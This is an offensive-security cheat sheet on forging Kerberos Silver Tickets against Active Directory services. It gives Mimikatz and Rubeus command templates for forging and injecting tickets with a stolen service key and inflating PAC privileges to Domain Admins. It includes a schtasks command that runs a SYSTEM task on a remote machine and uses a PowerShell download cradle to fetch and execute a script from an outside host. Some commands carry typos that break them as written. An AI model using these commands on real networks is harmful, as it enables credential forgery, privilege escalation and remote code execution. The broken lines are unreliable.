#mimikatz #schtasks #klist
- STs are encrypted with the service user's key derived from it's password.
- If we have this key, we can forge ST's for any service running under that user. These tickets are called Silver Tickets.
- Way more silent and powerful compared to the Golden Ticket attack because we are not interacting with the Domain Controller. We only interact with the service.
- A trade-off of this attack is that, the persistence duration is less than of the Golden Ticket attack, as the machine account (response for running services like win-rm, smb etc.) usually has a password rotation duration of 30 days.
- The key can be dumped from the lsass process memory or by [Kerberoast](../Privilege%20Escalation/Kerberoast.md), or dumping the entire AD Database (NTDS.dit file)
- The PAC is signed with the `krbtgt`'s account, hence a fake signature is used to create the PAC. The PAC signature is not verified if the the ticket is less than 20 minutes old. We can also add more privilege to the PAC, as it is not verified. For example, we can modify the PAC user group to include the `Domain Admins`. 
### Mimikatz
- Mimikatz can be used to forge silver tickets
```powershell
# Create silver ticket to list shares on the machine
kerberos::golden
	/user:administrator # username for which ST is generated
	/domain:<domain> # fqdn of the domain
	/sid:<sid> # sid of the domain
	/target:<server> # fqdn of the target server
	/service<service> # SPN of the service for which ST will be generated
	/aes256:<key> # aes key of the service account
	/id:<id> /group:<group> # Optional ID and groups
	/ptt # inject the ticket in current session
	# or
	/ticket # save the ticket on disk
	

# Create silver ticket to gain remote execution on the machine.
# set /service:HOST, this allows to schedule tasks on the machine.
kerberos::golden /domain:mydomain.local /sid:<domain-sid> /target:<targetmachine-FQDN> /service:HOST /rc4:<key> /user:Administrator /ptt
# verifiy with klist
klist
# shchedule the malicious task
schtasks /create /S machine.mydomain.local /SC Weekly /RU "NT Authoririty\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DonwloadString(''http://ip/file.ps1''')'"
# Run the task
schtasks /Run /S machine.mydomain.local /TN "STCheck"
```
### Rubeus
```powershell
Rubeus.exe
	silver
	/service:<spn> # SPN of the service
	/aes256:<key> # kerberos key of the service account of the above service
	/user:<username> # username for which the service account is created
	/ldap # make ldap queries to fetch details
	/ptt # Inject the key in current process memory
	[/printcmd] # print the rubues command to crate the same ticket with information fetched from ldap
```
### Services
- `HTTP` for WIM-RM
- `cifs` for SMB
- `HOST` for scheduling tasks
- `RPCSS` and `HOST` or WMI